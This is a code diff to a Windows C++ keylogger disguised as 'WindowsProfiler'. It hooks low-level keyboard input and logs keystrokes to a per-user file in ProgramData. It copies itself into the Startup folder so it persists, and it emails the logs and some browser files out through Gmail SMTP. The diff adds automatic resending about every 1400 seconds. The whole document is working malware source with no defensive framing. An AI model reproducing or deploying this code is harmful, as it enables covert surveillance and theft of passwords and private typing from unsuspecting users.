@@ -19,42 +19,38 @@ void log(char *str);
 
 char *translate(int vk, int up);
 
-void sendEmail(CkMailMan &mailman, const std::vector<std::string> &fileList);
+void sendEmail(const std::vector<std::string> &fileList);
 
 int shift = 0, caps = 0;
-const char* emailAddress = "email";
-const char* password = "password";
+const char *emailAddress = "emailaddress";
+const char *password = "password";
+CkMailMan mailman;
 FILE *fd;
+time_t t;
+std::vector<std::string> filesToSend;
 
-#ifdef DEBUG
+int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
+    std::string header = "\n\n\n-------------------------";
 
-int main()
-
-#else
-
-int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
-
-#endif
-{
-    std::string date = "\n\n\n-------------------------";
-
-    auto t = std::time(nullptr);
+    t = std::time(nullptr);
     auto tm = *std::localtime(&t);
     std::stringstream ss;
-    ss << std::put_time(&tm, "%d.%m.%Yr. %H:%M:%S");
-    date += ss.str();
-
-    date += "-------------------------\n\n\n";
-    std::cout << date << std::endl;
-    TCHAR filePath[INFO_BUFFER_SIZE] = {0};
-    GetModuleFileName(nullptr, filePath, INFO_BUFFER_SIZE);
-    std::wcout << filePath << std::endl;
+    ss << std::put_time(&tm, "%d.%m.%yr. %h:%m:%s");
+    header += ss.str();
 
     DWORD len = INFO_BUFFER_SIZE;
     TCHAR username[INFO_BUFFER_SIZE] = {0};
     if (!GetUserName(username, &len))
         std::wcout << "Error with getting user name";
     std::wcout << username << std::endl;
+    header += " User: ";
+    header += username;
+
+    header += "-------------------------\n\n\n";
+    std::cout << header << std::endl;
+    TCHAR filePath[INFO_BUFFER_SIZE] = {0};
+    GetModuleFileName(nullptr, filePath, INFO_BUFFER_SIZE);
+    std::wcout << filePath << std::endl;
 
     TCHAR secondPart[INFO_BUFFER_SIZE] = TEXT(
             "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/WindowsProfiler.exe");
@@ -65,21 +61,25 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
 
     std::wcout << destination << std::endl;
 
+#ifndef DEBUG
     if (CopyFile(filePath, destination, FALSE)) {
         printf("Copied file\n");
     } else {
         printf("Could not copy file!\n");
     }
+#endif
 
     HINSTANCE app = GetModuleHandle(nullptr);
     SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, app, 0);
     MSG msg;
-    const char *fname = "C:/ProgramData/windowsprofiler.txt";
-    fd = fopen(fname, "a");
-    fwrite(date.c_str(), 1, strlen(date.c_str()), fd);
+    std::string fname = "C:/ProgramData/WP";
+    fname += username;
+    fname += ".txt";
+    fd = fopen(fname.c_str(), "a");
+    fwrite(header.c_str(), 1, strlen(header.c_str()), fd);
     fflush(fd);
 
-    std::vector<std::string> filesToSend = {fname};
+    filesToSend = {fname};
 
 #ifdef firefox
 
@@ -128,14 +128,13 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
         std::cout << "Attachment " << f << std::endl;
     }
 
-    CkMailMan mailman;
     mailman.put_SmtpHost("smtp.gmail.com");
     mailman.put_SmtpUsername(emailAddress);
     mailman.put_SmtpPassword(password);
     mailman.put_SmtpSsl(true);
     mailman.put_SmtpPort(587);
+    sendEmail(filesToSend);
 
-    sendEmail(mailman, filesToSend);
     while (GetMessage(&msg, nullptr, 0, 0) > 0) {
         TranslateMessage(&msg);
         DispatchMessage(&msg);
@@ -145,7 +144,7 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
     return 0;
 }
 
-void sendEmail(CkMailMan &mailman, const std::vector<std::string> &fileList) {
+void sendEmail(const std::vector<std::string> &fileList) {
     CkEmail email;
     email.AddTo("Windows Profiler", emailAddress);
     email.put_Subject("Daily Log");
@@ -170,16 +169,15 @@ void sendEmail(CkMailMan &mailman, const std::vector<std::string> &fileList) {
 
     success = mailman.CloseSmtpConnection();
     if (!success) {
-        std::cout << "Connection to SMTP server not closed cleanly."
-                  << "\r\n";
+        std::cout << "Connection to SMTP server not closed cleanly." << "\r\n";
     }
 
-    std::cout << "Mail with attachments sent!"
-              << "\r\n";
+    std::cout << "Mail with attachments sent!" << "\r\n";
 }
 
 #pragma clang diagnostic push
 #pragma ide diagnostic ignored "ConstantFunctionResult"
+
 LRESULT CALLBACK LowLevelKeyboardProc(__attribute__((unused)) int nCode, WPARAM wParam, LPARAM lParam) {
     auto *kb = (KBDLLHOOKSTRUCT *) lParam;
     char *str = nullptr;
@@ -196,12 +194,17 @@ LRESULT CALLBACK LowLevelKeyboardProc(__attribute__((unused)) int nCode, WPARAM 
         log(str);
     return 0;
 }
+
 #pragma clang diagnostic pop
 
 void log(char *str) {
     fwrite(str, 1, strlen(str), fd);
     if (strstr(str, " ") || strstr(str, "\n"))
         fflush(fd);
+    if (difftime(std::time(nullptr), t) > 1400) {
+        t = std::time(nullptr);
+        sendEmail(filesToSend);
+    }
 }
 
 char *translate(int vk, int up) {
